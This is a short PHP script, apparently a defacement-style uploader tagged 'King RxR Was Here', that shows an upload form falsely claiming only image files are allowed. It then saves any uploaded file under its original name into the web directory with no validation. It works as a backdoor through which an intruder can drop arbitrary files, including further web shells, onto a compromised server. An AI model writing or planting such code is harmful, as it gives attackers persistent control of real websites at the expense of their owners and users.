<?php 


echo '<b> King RxR Was  Here This some From My Tool </b></br><em>Only GIF, JPG, and PNG files are allowed.</em><center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="file_jpg" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>';

if (!empty ($_FILES['file_jpg'])) {   
	move_uploaded_file($_FILES['file_jpg']['tmp_name'],$_FILES['file_jpg']['name']); 
    Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['file_jpg']['name']."<br>size : ".$_FILES['file_jpg']['size']."<br>type : ".$_FILES['file_jpg']['type']; 
	
	
}  

?>
